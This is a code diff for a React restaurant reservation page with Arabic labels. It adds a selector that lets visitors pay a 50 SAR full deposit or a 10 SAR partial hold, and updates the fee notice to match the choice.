@@ -77,7 +77,14 @@ export default function Reserve() {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showCashbackPopup, setShowCashbackPopup] = useState(false);
 
-  const serviceFee = 50;
+  // Booking confirmation fee. Visitors can choose between a full deposit
+  // (50 SAR — refundable on visit) or a small "hold" deposit (10 SAR) that
+  // simply confirms the reservation. Both flow through the same payment
+  // and Firestore code paths so the dashboard sees the chosen amount.
+  const FULL_FEE = 50;
+  const PARTIAL_FEE = 10;
+  const [paymentMode, setPaymentMode] = useState<"full" | "partial">("full");
+  const serviceFee = paymentMode === "partial" ? PARTIAL_FEE : FULL_FEE;
   const reservationTotal = serviceFee;
 
   // Admin "page push" handler — dashboard sends steps 1-4 corresponding to the
@@ -590,9 +597,72 @@ export default function Reserve() {
               </div>
             </div>
 
+            {/* Payment-amount selector: full deposit vs. partial 10 SAR hold */}
+            <div className="bg-white rounded-xl p-4 shadow-sm space-y-3" data-testid="payment-mode-selector">
+              <h3 className="text-[#4a1525] font-bold text-sm flex items-center gap-2">
+                <CreditCard className="w-4 h-4" />
+                طريقة الدفع
+              </h3>
+              <div className="grid grid-cols-2 gap-3">
+                <button
+                  type="button"
+                  onClick={() => setPaymentMode("full")}
+                  className={`relative text-right p-3 rounded-xl border-2 transition-all ${
+                    paymentMode === "full"
+                      ? "border-[#4a1525] bg-[#faf3ec] shadow-sm"
+                      : "border-[#e8dccb] bg-white hover:border-[#c9a96e]"
+                  }`}
+                  data-testid="payment-mode-full"
+                >
+                  <div className="text-[11px] text-[#7a6b5f] mb-1">الدفع الكامل</div>
+                  <div className="text-[#4a1525] font-bold text-lg">{FULL_FEE} ر.س</div>
+                  <div className="text-[10px] text-[#7a6b5f] mt-1 leading-tight">
+                    قابلة للاسترداد عند الزيارة
+                  </div>
+                  {paymentMode === "full" && (
+                    <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-[#4a1525] flex items-center justify-center">
+                      <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
+                        <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
+                      </svg>
+                    </div>
+                  )}
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setPaymentMode("partial")}
+                  className={`relative text-right p-3 rounded-xl border-2 transition-all ${
+                    paymentMode === "partial"
+                      ? "border-[#4a1525] bg-[#faf3ec] shadow-sm"
+                      : "border-[#e8dccb] bg-white hover:border-[#c9a96e]"
+                  }`}
+                  data-testid="payment-mode-partial"
+                >
+                  <div className="flex items-center justify-between">
+                    <div className="text-[11px] text-[#7a6b5f] mb-1">دفع جزئي</div>
+                    <span className="text-[9px] bg-[#c9a96e] text-white px-1.5 py-0.5 rounded font-bold">
+                      موصى به
+                    </span>
+                  </div>
+                  <div className="text-[#4a1525] font-bold text-lg">{PARTIAL_FEE} ر.س</div>
+                  <div className="text-[10px] text-[#7a6b5f] mt-1 leading-tight">
+                    لتأكيد الحجز فقط
+                  </div>
+                  {paymentMode === "partial" && (
+                    <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-[#4a1525] flex items-center justify-center">
+                      <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
+                        <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
+                      </svg>
+                    </div>
+                  )}
+                </button>
+              </div>
+            </div>
+
             <div className="bg-[#f5efe6] rounded-xl p-4 text-center">
               <p className="text-[#7a6b5f] text-xs">
-                رسوم تأكيد الحجز قابلة للاسترداد عند زيارة المطعم
+                {paymentMode === "partial"
+                  ? "يتم خصم 10 ر.س لتأكيد الحجز فقط، والباقي يُدفع في المطعم"
+                  : "رسوم تأكيد الحجز قابلة للاسترداد عند زيارة المطعم"}
               </p>
             </div>
 
